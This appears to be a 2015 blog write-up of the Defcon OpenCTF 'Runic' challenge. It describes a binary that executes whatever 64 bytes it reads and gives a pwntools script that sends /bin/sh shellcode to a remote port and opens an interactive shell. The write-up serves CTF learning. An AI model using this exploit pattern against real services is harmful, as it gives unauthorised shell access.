---
layout: post
title:  "Defcon OpenCTF - Runic"
date:   2015-08-13 18:03:59
categories: CTF Pwnable
---

Below is the main function for Runic:

![Runic main](/assets/images/runic.png)

The following events happen:

* read() of 0x40 bytes (64 bytes)
* call() to the buffer that was just read into

We can send a max of 64 bytes of shellcode, which is immediately executed.

## Exploitation

The following script simply sends a `/bin/sh` shellcode, and a shell of ours.

```python
import sys
from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git

context(arch='x86', os='linux')

HOST = '127.0.0.1'
PORT = 4444

## Example
# r = process('./runic')
r = remote(HOST, PORT)

# Debug process
'''
gdb.attach(r, """
bp 80484fa
c
""")
'''

shellcode = asm(shellcraft.sh())

r.sendline(shellcode)

r.interactive()
```
